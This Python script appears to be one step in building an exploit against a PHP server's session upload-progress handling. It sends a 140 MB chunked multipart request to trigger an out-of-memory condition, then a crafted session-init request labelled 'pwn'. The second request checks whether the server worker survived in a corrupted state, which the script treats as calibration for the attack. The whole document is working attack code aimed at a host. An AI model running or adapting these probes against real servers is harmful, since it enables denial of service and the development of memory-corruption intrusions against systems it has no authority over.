#!/usr/bin/env python3
"""Worker survival diagnostic.

After the OOM (step A), send a 'session-init, no file' request:
  - If the worker SURVIVED the OOM in a corrupted state -> this request
    aborts (prefork child dies / RST / no clean 200).
  - If the worker CRASHED and prefork re-forked a fresh one -> this request
    succeeds (200, clean cookie).

This distinguishes 'calibration wrong' from 'worker not surviving the OOM'.
"""
from __future__ import annotations
import sys
import time
from common import Target, build_multipart, extract_cookie_line

t = Target("192.168.8.123", 18113, verbose=False)
bnd = b"S" * 17

# step A: OOM
parts = [
    {"name": "PHPSESSID", "data": b"\x00"},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    {"name": "f", "filename": "a.txt", "data": b"A" * 64},
    {"name": "big", "data": b"B" * (140 * 1024 * 1024)},
]
body = build_multipart(parts, bnd)
st, raw = t.post_chunked(body, bnd, read_cap=65536)
print(f"step A (OOM 140MB): status={st}  cookie={extract_cookie_line(raw)[:70]!r}", flush=True)
time.sleep(0.4)

# step B: session-init, NO file (the 'corrupted worker aborts' probe)
parts_b = [
    {"name": "PHPSESSID", "data": b"attacksessionid0001"},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
]
body_b = build_multipart(parts_b, b"BNDRY12345")
st_b, raw_b = t.post_chunked(body_b, b"BNDRY12345", read_cap=65536)
print(f"step B (session-init no-file): status={st_b}  cookie={extract_cookie_line(raw_b)[:70]!r}", flush=True)
print(f"step B raw head: {raw_b[:200]!r}", flush=True)
